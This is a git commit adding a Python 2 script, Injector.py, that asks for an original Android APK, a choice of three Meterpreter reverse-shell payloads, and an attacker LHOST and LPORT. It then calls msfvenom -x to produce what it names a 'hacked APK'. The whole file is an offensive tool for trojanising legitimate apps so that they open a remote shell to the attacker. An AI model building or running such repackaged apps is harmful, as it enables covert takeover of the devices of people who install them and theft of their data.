d356a1a97bbb3d3a7a4ca472f1df7ddb57c3f082
1Xler <53712571+1Xler@users.noreply.github.com>
2019-08-04 22:36:32 +0000

    Add files via upload

---
+++ Injector.py
@@ -0,0 +1,45 @@
+#!/usr/bin/env python
+# coding: utf8
+
+import os  
+import colorama 
+from colorama import init, Fore, Style
+
+#Printing my logo 
+print (colorama.Fore.RED)
+print (" ▓▓  ▓▓▓   ▓▓   ▓▓  ▓▓▓▓▓▓  ▓▓   ▓▓ ▓▓▓▓▓▓▓▓   ▓▓▓▓▓▓   ▓▓▓▓▓▓▓             ")
+print (" ▓▓  ▓▓ ▓  ▓▓       ▓▓      ▓▓  ▓▓     ▓▓     ▓▓    ▓▓  ▓▓     ▓▓            ")
+print (" ▓▓  ▓▓  ▓ ▓▓   ▓▓  ▓▓▓▓▓▓  ▓▓▓▓       ▓▓     ▓▓    ▓▓  ▓▓▓▓▓▓▓             ")  
+print (" ▓▓  ▓▓   ▓▓▓   ▓▓  ▓▓      ▓▓  ▓▓     ▓▓     ▓▓    ▓▓  ▓▓    ▓▓             ")
+print (" ▓▓  ▓▓    ▓▓ ▓▓▓▓  ▓▓▓▓▓▓  ▓▓   ▓▓    ▓▓      ▓▓▓▓▓▓   ▓▓     ▓▓   @by Xler ")
+print("☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰")
+print("")
+print (Style.RESET_ALL)
+
+#get the information 
+apkname = raw_input ("Full path to original APK(Path/to/original.apk):")
+print ("Which payload?                          ")
+print ("  1. android/meterpreter/reverse_http   ")
+print ("  2. android/meterpreter/reverse_https  ")
+print ("  3. android/meterpreter/reverse_tcp    ")
+payload = raw_input()
+
+if payload == "1":
+ pay ="android/meterpreter/reverse_http"
+if payload == "2":
+ pay ="android/meterpreter/reverse_https" 
+if payload == "3":
+ pay ="android/meterpreter/reverse_tcp"
+
+host = raw_input("LHOST:")
+port = raw_input("LPORT:")
+nameaf = raw_input("Path for the hacked APK and name(example: Path/to/hacked.apk):")
+gen = raw_input ("Start to generate?(y/n)")
+
+#execute the command
+if gen == "y":
+  os.popen ("".join(("msfvenom -x "+apkname, " -p "+pay, " LHOST="+host, " LPORT="+port, " -o "+nameaf )))
+
+else: 
+   exit 
+
